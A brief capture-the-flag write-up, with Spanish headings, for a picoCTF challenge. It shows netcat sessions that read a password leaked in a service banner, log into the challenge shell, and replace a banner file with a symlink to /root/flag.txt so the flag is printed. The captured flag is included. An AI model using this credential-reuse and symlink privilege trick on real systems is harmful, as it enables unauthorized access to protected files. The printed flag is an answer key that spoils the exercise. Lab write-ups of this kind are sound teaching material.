Reto
dont-you-love-banners
Descripción
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 53000`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 57444`. From the above information abuse the machine and find the flag in the /root directory.
Solución
```
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 53000
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 57444
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234

What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper 
player@challenge:~$
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 57444
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}
```
Notas adicionales
Referencias